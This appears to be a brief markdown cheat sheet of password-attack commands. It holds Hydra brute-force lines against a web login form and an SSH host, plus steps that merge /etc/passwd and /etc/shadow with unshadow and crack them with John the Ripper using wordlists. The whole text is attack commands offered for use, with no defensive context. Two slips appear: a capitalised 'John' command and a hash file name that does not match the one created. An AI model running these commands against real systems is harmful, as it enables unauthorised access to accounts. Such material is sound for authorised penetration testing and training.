### Hydra:

> -  hydra targetWebsite http-post-form "/login.php:user=^USER^&pwd=^PASS^:invalid credentials" -L /usr/share/ncrack/minimal.usr -P /usr/share/seclists/Passwords/rockyou-15.txt  -f -v

&nbsp;
>  - hydra 192.168.2.4 ssh -L /usr/share/ncrack/minimal.usr -P /usr/share/seclists/Passwords/rockyou-10.txt -f -v 

	
&nbsp;

	
### John

__Unshadow__

> - unshadow /etc/passwd /etc/shadow > hashes.txt 

> - john --wordlist=/usr/share/john/password.lst hashes

> - John --show hashes 




